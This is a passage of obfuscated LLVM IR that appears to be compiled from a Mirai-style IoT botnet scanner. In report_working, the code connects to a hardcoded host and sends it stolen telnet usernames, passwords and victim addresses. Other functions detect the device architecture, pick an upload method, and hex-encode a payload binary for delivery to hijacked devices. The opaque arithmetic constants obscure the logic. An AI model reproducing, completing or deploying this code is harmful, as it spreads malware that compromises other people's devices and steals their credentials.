  %141 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %140, i32 0, i32 14
  store i16 8, i16* %141, align 2
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.134, i32 0, i32 0), i8** %7, align 8
  br label %171

; <label>:142:                                    ; preds = %133, %127
  %143 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %144 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %143, i32 0, i32 14
  %145 = load i16, i16* %144, align 2
  %146 = zext i16 %145 to i32
  %147 = icmp eq i32 %146, 8
  br i1 %147, label %148, label %154

; <label>:148:                                    ; preds = %142
  %149 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %150 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %149, i32 0, i32 11
  %151 = load i8, i8* %150, align 2
  %152 = zext i8 %151 to i32
  %153 = icmp eq i32 %152, 1
  br i1 %153, label %166, label %154

; <label>:154:                                    ; preds = %148, %142
  %155 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %156 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %155, i32 0, i32 14
  %157 = load i16, i16* %156, align 2
  %158 = zext i16 %157 to i32
  %159 = icmp eq i32 %158, 10
  br i1 %159, label %160, label %169

; <label>:160:                                    ; preds = %154
  %161 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %162 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %161, i32 0, i32 11
  %163 = load i8, i8* %162, align 2
  %164 = zext i8 %163 to i32
  %165 = icmp eq i32 %164, 1
  br i1 %165, label %166, label %169

; <label>:166:                                    ; preds = %160, %148
  %167 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %168 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %167, i32 0, i32 14
  store i16 8, i16* %168, align 2
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.135, i32 0, i32 0), i8** %7, align 8
  br label %170

; <label>:169:                                    ; preds = %160, %154
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.116, i32 0, i32 0), i8** %7, align 8
  br label %170

; <label>:170:                                    ; preds = %169, %166
  br label %171

; <label>:171:                                    ; preds = %170, %139
  br label %172

; <label>:172:                                    ; preds = %171, %114
  br label %173

; <label>:173:                                    ; preds = %172, %107
  br label %174

; <label>:174:                                    ; preds = %173, %100
  %175 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %176 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %175, i32 0, i32 8
  %177 = getelementptr inbounds [16 x i8], [16 x i8]* %176, i32 0, i32 0
  %178 = load i8*, i8** %7, align 8
  %179 = call i8* @strcpy(i8* %177, i8* %178) #7
  %180 = load i32, i32* %5, align 4
  store i32 %180, i32* %2, align 4
  br label %181

; <label>:181:                                    ; preds = %174, %93, %47
  %182 = load i32, i32* %2, align 4
  ret i32 %182
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_arm_subtype(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  call void @table_unlock_val(i8 zeroext 12)
  %7 = call i8* @table_retrieve_val(i32 12, i32* %6)
  store i8* %7, i8** %4, align 8
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 4
  %13 = load i32, i32* %12, align 8
  %14 = load i8*, i8** %4, align 8
  %15 = load i32, i32* %6, align 4
  %16 = sub i32 0, 1
  %17 = add i32 %15, %16
  %18 = sub nsw i32 %15, 1
  %19 = call i32 @util_memsearch(i8* %10, i32 %13, i8* %14, i32 %17)
  store i32 %19, i32* %5, align 4
  call void @table_lock_val(i8 zeroext 12)
  %20 = load i32, i32* %5, align 4
  %21 = icmp eq i32 %20, -1
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %59

; <label>:23:                                     ; preds = %1
  %24 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %25 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %24, i32 0, i32 7
  %26 = getelementptr inbounds [8192 x i8], [8192 x i8]* %25, i32 0, i32 0
  %27 = load i32, i32* %5, align 4
  %28 = sub i32 %27, 58090132
  %29 = sub i32 %28, 1
  %30 = add i32 %29, 58090132
  %31 = sub nsw i32 %27, 1
  %32 = call i32 @util_memsearch(i8* %26, i32 %30, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.136, i32 0, i32 0), i32 5)
  %33 = icmp ne i32 %32, -1
  br i1 %33, label %45, label %34

; <label>:34:                                     ; preds = %23
  %35 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %36 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %35, i32 0, i32 7
  %37 = getelementptr inbounds [8192 x i8], [8192 x i8]* %36, i32 0, i32 0
  %38 = load i32, i32* %5, align 4
  %39 = add i32 %38, 1999566575
  %40 = sub i32 %39, 1
  %41 = sub i32 %40, 1999566575
  %42 = sub nsw i32 %38, 1
  %43 = call i32 @util_memsearch(i8* %37, i32 %41, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.137, i32 0, i32 0), i32 5)
  %44 = icmp ne i32 %43, -1
  br i1 %44, label %45, label %52

; <label>:45:                                     ; preds = %34, %23
  %46 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %47 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %46, i32 0, i32 8
  %48 = getelementptr inbounds [16 x i8], [16 x i8]* %47, i32 0, i32 0
  %49 = call i8* @strcpy(i8* %48, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.138, i32 0, i32 0)) #7
  %50 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %51 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %50, i32 0, i32 14
  store i16 41, i16* %51, align 2
  br label %57

; <label>:52:                                     ; preds = %34
  %53 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %54 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %53, i32 0, i32 8
  %55 = getelementptr inbounds [16 x i8], [16 x i8]* %54, i32 0, i32 0
  %56 = call i8* @strcpy(i8* %55, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.109, i32 0, i32 0)) #7
  br label %57

; <label>:57:                                     ; preds = %52, %45
  %58 = load i32, i32* %5, align 4
  store i32 %58, i32* %2, align 4
  br label %59

; <label>:59:                                     ; preds = %57, %22
  %60 = load i32, i32* %2, align 4
  ret i32 %60
}

; Function Attrs: noinline nounwind uwtable
define internal void @report_working(i32, i32, %struct.scanner_connection*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.scanner_connection*, align 8
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.resolv_entries*, align 8
  %13 = alloca %union.__SOCKADDR_ARG, align 8
  store i32 %0, i32* %5, align 4
  store i32 %1, i32* %6, align 4
  store %struct.scanner_connection* %2, %struct.scanner_connection** %7, align 8
  store i32 %3, i32* %8, align 4
  %14 = call i32 @fork() #7
  store i32 %14, i32* %10, align 4
  store %struct.resolv_entries* null, %struct.resolv_entries** %12, align 8
  %15 = load i32, i32* %10, align 4
  %16 = icmp sgt i32 %15, 0
  br i1 %16, label %20, label %17

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %10, align 4
  %19 = icmp eq i32 %18, -1
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %17, %4
  ret void

; <label>:21:                                     ; preds = %17
  %22 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %22, i32* %11, align 4
  %23 = icmp eq i32 %22, -1
  br i1 %23, label %24, label %25

; <label>:24:                                     ; preds = %21
  call void @exit(i32 0) #8
  unreachable

; <label>:25:                                     ; preds = %21
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %26, align 4
  %27 = call i32 @htonl(i32 -1335130672) #9
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %29 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %28, i32 0, i32 0
  store i32 %27, i32* %29, align 4
  %30 = call zeroext i16 @htons(i16 zeroext 1293) #9
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i32, i32* %11, align 4
  %33 = bitcast %union.__SOCKADDR_ARG* %13 to %struct.sockaddr**
  %34 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %34, %struct.sockaddr** %33, align 8
  %35 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %13, i32 0, i32 0
  %36 = load %struct.sockaddr*, %struct.sockaddr** %35, align 8
  %37 = call i32 @connect(i32 %32, %struct.sockaddr* %36, i32 16)
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %42

; <label>:39:                                     ; preds = %25
  %40 = load i32, i32* %11, align 4
  %41 = call i32 @close(i32 %40)
  call void @exit(i32 0) #8
  unreachable

; <label>:42:                                     ; preds = %25
  %43 = load i32, i32* %11, align 4
  %44 = load i32, i32* %5, align 4
  %45 = xor i32 255, -1
  %46 = xor i32 %44, %45
  %47 = and i32 %46, %44
  %48 = and i32 %44, 255
  %49 = load i32, i32* %5, align 4
  %50 = lshr i32 %49, 8
  %51 = xor i32 %50, -1
  %52 = xor i32 255, -1
  %53 = xor i32 -1472722185, -1
  %54 = or i32 %51, %52
  %55 = or i32 -1472722185, %53
  %56 = xor i32 %54, -1
  %57 = and i32 %56, %55
  %58 = and i32 %50, 255
  %59 = load i32, i32* %5, align 4
  %60 = lshr i32 %59, 16
  %61 = xor i32 255, -1
  %62 = xor i32 %60, %61
  %63 = and i32 %62, %60
  %64 = and i32 %60, 255
  %65 = load i32, i32* %5, align 4
  %66 = lshr i32 %65, 24
  %67 = xor i32 255, -1
  %68 = xor i32 %66, %67
  %69 = and i32 %68, %66
  %70 = and i32 %66, 255
  %71 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %72 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %71, i32 0, i32 0
  %73 = load %struct.scanner_auth*, %struct.scanner_auth** %72, align 8
  %74 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %73, i32 0, i32 0
  %75 = load i8*, i8** %74, align 8
  %76 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %77 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %76, i32 0, i32 0
  %78 = load %struct.scanner_auth*, %struct.scanner_auth** %77, align 8
  %79 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %78, i32 0, i32 1
  %80 = load i8*, i8** %79, align 8
  %81 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %82 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %81, i32 0, i32 8
  %83 = getelementptr inbounds [16 x i8], [16 x i8]* %82, i32 0, i32 0
  %84 = load i32, i32* %8, align 4
  %85 = icmp eq i32 %84, 1
  %86 = select i1 %85, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.129, i32 0, i32 0)
  %87 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %88 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %87, i32 0, i32 1
  %89 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %88, i32 0, i32 1
  %90 = load i32, i32* %89, align 4
  %91 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %92 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %91, i32 0, i32 9
  %93 = load i8, i8* %92, align 4
  %94 = zext i8 %93 to i32
  %95 = call i32 (i32, i8*, ...) @fdsend(i32 %43, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.127, i32 0, i32 0), i32 %47, i32 %57, i32 %63, i32 %69, i8* %75, i8* %80, i8* %83, i8* %86, i32 %90, i32 %94)
  %96 = load i32, i32* %11, align 4
  %97 = call i32 @close(i32 %96)
  call void @exit(i32 0) #8
  unreachable
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @connection_consume_upload_methods(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  call void @table_unlock_val(i8 zeroext 12)
  %7 = call i8* @table_retrieve_val(i32 12, i32* %6)
  store i8* %7, i8** %4, align 8
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 4
  %13 = load i32, i32* %12, align 8
  %14 = load i8*, i8** %4, align 8
  %15 = load i32, i32* %6, align 4
  %16 = sub i32 %15, -22151537
  %17 = sub i32 %16, 1
  %18 = add i32 %17, -22151537
  %19 = sub nsw i32 %15, 1
  %20 = call i32 @util_memsearch(i8* %10, i32 %13, i8* %14, i32 %18)
  store i32 %20, i32* %5, align 4
  call void @table_lock_val(i8 zeroext 12)
  %21 = load i32, i32* %5, align 4
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %23, label %24

; <label>:23:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %60

; <label>:24:                                     ; preds = %1
  %25 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %26 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %25, i32 0, i32 7
  %27 = getelementptr inbounds [8192 x i8], [8192 x i8]* %26, i32 0, i32 0
  %28 = load i32, i32* %5, align 4
  %29 = sub i32 0, 1
  %30 = add i32 %28, %29
  %31 = sub nsw i32 %28, 1
  %32 = call i32 @util_memsearch(i8* %27, i32 %30, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.148, i32 0, i32 0), i32 10)
  %33 = icmp ne i32 %32, -1
  br i1 %33, label %34, label %38

; <label>:34:                                     ; preds = %24
  %35 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %36 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %35, i32 0, i32 1
  %37 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %36, i32 0, i32 1
  store i32 1, i32* %37, align 4
  br label %58

; <label>:38:                                     ; preds = %24
  %39 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %40 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %39, i32 0, i32 7
  %41 = getelementptr inbounds [8192 x i8], [8192 x i8]* %40, i32 0, i32 0
  %42 = load i32, i32* %5, align 4
  %43 = add i32 %42, -2116778994
  %44 = sub i32 %43, 1
  %45 = sub i32 %44, -2116778994
  %46 = sub nsw i32 %42, 1
  %47 = call i32 @util_memsearch(i8* %41, i32 %45, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.149, i32 0, i32 0), i32 10)
  %48 = icmp ne i32 %47, -1
  br i1 %48, label %49, label %53

; <label>:49:                                     ; preds = %38
  %50 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %51 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %50, i32 0, i32 1
  %52 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %51, i32 0, i32 1
  store i32 2, i32* %52, align 4
  br label %57

; <label>:53:                                     ; preds = %38
  %54 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %55 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %54, i32 0, i32 1
  %56 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %55, i32 0, i32 1
  store i32 0, i32* %56, align 4
  br label %57

; <label>:57:                                     ; preds = %53, %49
  br label %58

; <label>:58:                                     ; preds = %57, %34
  %59 = load i32, i32* %5, align 4
  store i32 %59, i32* %2, align 4
  br label %60

; <label>:60:                                     ; preds = %58, %23
  %61 = load i32, i32* %2, align 4
  ret i32 %61
}

; Function Attrs: noinline nounwind uwtable
define internal %struct.payload* @get_retrieve_binary(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.payload*, align 8
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i32, align 4
  %5 = alloca %struct.payload*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 0, i32* %4, align 4
  %6 = load i32, i32* %4, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [4 x %struct.payload], [4 x %struct.payload]* @payloads, i64 0, i64 %7
  store %struct.payload* %8, %struct.payload** %5, align 8
  br label %9

; <label>:9:                                      ; preds = %38, %1
  %10 = load %struct.payload*, %struct.payload** %5, align 8
  %11 = icmp ne %struct.payload* %10, null
  br i1 %11, label %12, label %46

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, 4
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %12
  br label %46

; <label>:16:                                     ; preds = %12
  %17 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %18 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %17, i32 0, i32 11
  %19 = load i8, i8* %18, align 2
  %20 = zext i8 %19 to i32
  %21 = load %struct.payload*, %struct.payload** %5, align 8
  %22 = getelementptr inbounds %struct.payload, %struct.payload* %21, i32 0, i32 0
  %23 = load i8, i8* %22, align 8
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %20, %24
  br i1 %25, label %26, label %38

; <label>:26:                                     ; preds = %16
  %27 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %27, i32 0, i32 14
  %29 = load i16, i16* %28, align 2
  %30 = zext i16 %29 to i32
  %31 = load %struct.payload*, %struct.payload** %5, align 8
  %32 = getelementptr inbounds %struct.payload, %struct.payload* %31, i32 0, i32 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 %30, %34
  br i1 %35, label %36, label %38

; <label>:36:                                     ; preds = %26
  %37 = load %struct.payload*, %struct.payload** %5, align 8
  store %struct.payload* %37, %struct.payload** %2, align 8
  br label %47

; <label>:38:                                     ; preds = %26, %16
  %39 = load %struct.payload*, %struct.payload** %5, align 8
  %40 = getelementptr inbounds %struct.payload, %struct.payload* %39, i32 1
  store %struct.payload* %40, %struct.payload** %5, align 8
  %41 = load i32, i32* %4, align 4
  %42 = sub i32 %41, 542574751
  %43 = add i32 %42, 1
  %44 = add i32 %43, 542574751
  %45 = add nsw i32 %41, 1
  store i32 %44, i32* %4, align 4
  br label %9

; <label>:46:                                     ; preds = %15, %9
  store %struct.payload* null, %struct.payload** %2, align 8
  br label %47

; <label>:47:                                     ; preds = %46, %36
  %48 = load %struct.payload*, %struct.payload** %2, align 8
  ret %struct.payload* %48
}

; Function Attrs: noinline nounwind uwtable
define internal %struct.binary* @process_retrieve_binary(%struct.payload*) #0 {
  %2 = alloca %struct.payload*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.binary*, align 8
  %6 = alloca [5 x i8], align 1
  %7 = alloca i32, align 4
  %8 = alloca [256 x i8], align 16
  store %struct.payload* %0, %struct.payload** %2, align 8
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  store i32 0, i32* %7, align 4
  %9 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %9, i8 0, i64 256, i32 16, i1 false)
  %10 = load %struct.payload*, %struct.payload** %2, align 8
  %11 = getelementptr inbounds %struct.payload, %struct.payload* %10, i32 0, i32 3
  %12 = load i16, i16* %11, align 8
  %13 = zext i16 %12 to i32
  %14 = sdiv i32 %13, 64
  %15 = add i32 %14, -677984854
  %16 = add i32 %15, 1
  %17 = sub i32 %16, -677984854
  %18 = add nsw i32 %14, 1
  %19 = sext i32 %17 to i64
  %20 = call noalias i8* @calloc(i64 %19, i64 16) #7
  %21 = bitcast i8* %20 to %struct.binary*
  store %struct.binary* %21, %struct.binary** %5, align 8
  store i32 0, i32* %3, align 4
  br label %22

; <label>:22:                                     ; preds = %42, %1
  %23 = load i32, i32* %3, align 4
  %24 = load %struct.payload*, %struct.payload** %2, align 8
  %25 = getelementptr inbounds %struct.payload, %struct.payload* %24, i32 0, i32 3
  %26 = load i16, i16* %25, align 8
  %27 = zext i16 %26 to i32
  %28 = sdiv i32 %27, 64
  %29 = sub i32 0, %28
  %30 = sub i32 0, 1
  %31 = add i32 %29, %30
  %32 = sub i32 0, %31
  %33 = add nsw i32 %28, 1
  %34 = icmp slt i32 %23, %32
  br i1 %34, label %35, label %48

; <label>:35:                                     ; preds = %22
  %36 = call noalias i8* @malloc(i64 256) #7
  %37 = load %struct.binary*, %struct.binary** %5, align 8
  %38 = load i32, i32* %3, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds %struct.binary, %struct.binary* %37, i64 %39
  %41 = getelementptr inbounds %struct.binary, %struct.binary* %40, i32 0, i32 0
  store i8* %36, i8** %41, align 8
  br label %42

; <label>:42:                                     ; preds = %35
  %43 = load i32, i32* %3, align 4
  %44 = add i32 %43, -781925033
  %45 = add i32 %44, 1
  %46 = sub i32 %45, -781925033
  %47 = add nsw i32 %43, 1
  store i32 %46, i32* %3, align 4
  br label %22

; <label>:48:                                     ; preds = %22
  br label %49

; <label>:49:                                     ; preds = %113, %48
  store i32 0, i32* %3, align 4
  br label %50

; <label>:50:                                     ; preds = %93, %49
  %51 = load i32, i32* %3, align 4
  %52 = load %struct.payload*, %struct.payload** %2, align 8
  %53 = getelementptr inbounds %struct.payload, %struct.payload* %52, i32 0, i32 3
  %54 = load i16, i16* %53, align 8
  %55 = zext i16 %54 to i32
  %56 = icmp slt i32 %51, %55
  br i1 %56, label %57, label %99

; <label>:57:                                     ; preds = %50
  %58 = load i32, i32* %3, align 4
  %59 = icmp eq i32 %58, 64
  br i1 %59, label %72, label %60

; <label>:60:                                     ; preds = %57
  %61 = load i32, i32* %4, align 4
  %62 = load i32, i32* %3, align 4
  %63 = add i32 %61, 1402786463
  %64 = add i32 %63, %62
  %65 = sub i32 %64, 1402786463
  %66 = add nsw i32 %61, %62
  %67 = load %struct.payload*, %struct.payload** %2, align 8
  %68 = getelementptr inbounds %struct.payload, %struct.payload* %67, i32 0, i32 3
  %69 = load i16, i16* %68, align 8
  %70 = zext i16 %69 to i32
  %71 = icmp sge i32 %65, %70
  br i1 %71, label %72, label %73

; <label>:72:                                     ; preds = %60, %57
  br label %99

; <label>:73:                                     ; preds = %60
  %74 = getelementptr inbounds [5 x i8], [5 x i8]* %6, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %74, i8 0, i64 5, i32 1, i1 false)
  %75 = getelementptr inbounds [5 x i8], [5 x i8]* %6, i32 0, i32 0
  %76 = load %struct.payload*, %struct.payload** %2, align 8
  %77 = getelementptr inbounds %struct.payload, %struct.payload* %76, i32 0, i32 2
  %78 = load i8*, i8** %77, align 8
  %79 = load i32, i32* %4, align 4
  %80 = load i32, i32* %3, align 4
  %81 = sub i32 %79, 808914127
  %82 = add i32 %81, %80
  %83 = add i32 %82, 808914127
  %84 = add nsw i32 %79, %80
  %85 = sext i32 %83 to i64
  %86 = getelementptr inbounds i8, i8* %78, i64 %85
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = call i32 (i8*, i8*, ...) @szprintf(i8* %75, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.130, i32 0, i32 0), i32 %88)
  %90 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i32 0, i32 0
  %91 = getelementptr inbounds [5 x i8], [5 x i8]* %6, i32 0, i32 0
  %92 = call i8* @strcat(i8* %90, i8* %91) #7
  br label %93

; <label>:93:                                     ; preds = %73
  %94 = load i32, i32* %3, align 4
  %95 = add i32 %94, -1621162776
  %96 = add i32 %95, 1
  %97 = sub i32 %96, -1621162776
  %98 = add nsw i32 %94, 1
  store i32 %97, i32* %3, align 4
  br label %50

; <label>:99:                                     ; preds = %72, %50
  %100 = load i32, i32* %7, align 4
  %101 = load %struct.payload*, %struct.payload** %2, align 8
  %102 = getelementptr inbounds %struct.payload, %struct.payload* %101, i32 0, i32 3
  %103 = load i16, i16* %102, align 8
  %104 = zext i16 %103 to i32
  %105 = sdiv i32 %104, 64
  %106 = add i32 %105, -68317193
  %107 = add i32 %106, 1
  %108 = sub i32 %107, -68317193
  %109 = add nsw i32 %105, 1
  %110 = icmp eq i32 %100, %108
  br i1 %110, label %111, label %113

; <label>:111:                                    ; preds = %99
  %112 = load %struct.binary*, %struct.binary** %5, align 8
  ret %struct.binary* %112

; <label>:113:                                    ; preds = %99
  %114 = load %struct.binary*, %struct.binary** %5, align 8
  %115 = load i32, i32* %7, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds %struct.binary, %struct.binary* %114, i64 %116
  %118 = getelementptr inbounds %struct.binary, %struct.binary* %117, i32 0, i32 0
  %119 = load i8*, i8** %118, align 8
  %120 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i32 0, i32 0
  %121 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i32 0, i32 0
  %122 = call i32 @util_strlen(i8* %121)
  %123 = sext i32 %122 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %119, i8* %120, i64 %123, i32 1, i1 false)
  %124 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %124, i8 0, i64 256, i32 16, i1 false)
  %125 = load i32, i32* %7, align 4
  %126 = trunc i32 %125 to i8
  %127 = load %struct.binary*, %struct.binary** %5, align 8
  %128 = getelementptr inbounds %struct.binary, %struct.binary* %127, i32 0, i32 1
  store i8 %126, i8* %128, align 8
  %129 = load i32, i32* %7, align 4
  %130 = sub i32 0, 1
  %131 = sub i32 %129, %130
  %132 = add nsw i32 %129, 1
  store i32 %131, i32* %7, align 4
  %133 = load i32, i32* %3, align 4
  %134 = load i32, i32* %4, align 4
  %135 = sub i32 %134, -2025157266
  %136 = add i32 %135, %133
  %137 = add i32 %136, -2025157266
  %138 = add nsw i32 %134, %133
  store i32 %137, i32* %4, align 4
  br label %49
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_method_resonse(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  %7 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %8 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %7, i32 0, i32 7
  %9 = getelementptr inbounds [8192 x i8], [8192 x i8]* %8, i32 0, i32 0
  %10 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %11 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %10, i32 0, i32 4
  %12 = load i32, i32* %11, align 8
  %13 = call i32 @util_memsearch(i8* %9, i32 %12, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.150, i32 0, i32 0), i32 20)
  %14 = icmp ne i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %1
  store i32 -2, i32* %2, align 4
  br label %47

; <label>:16:                                     ; preds = %1
  %17 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %18 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %17, i32 0, i32 7
  %19 = getelementptr inbounds [8192 x i8], [8192 x i8]* %18, i32 0, i32 0
  %20 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %21 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %20, i32 0, i32 4
  %22 = load i32, i32* %21, align 8
  %23 = call i32 @util_memsearch(i8* %19, i32 %22, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.151, i32 0, i32 0), i32 16)
  %24 = icmp ne i32 %23, -1
  br i1 %24, label %25, label %26

; <label>:25:                                     ; preds = %16
  store i32 -1, i32* %2, align 4
  br label %47

; <label>:26:                                     ; preds = %16
  br label %27

; <label>:27:                                     ; preds = %26
  call void @table_unlock_val(i8 zeroext 12)
  %28 = call i8* @table_retrieve_val(i32 12, i32* %6)
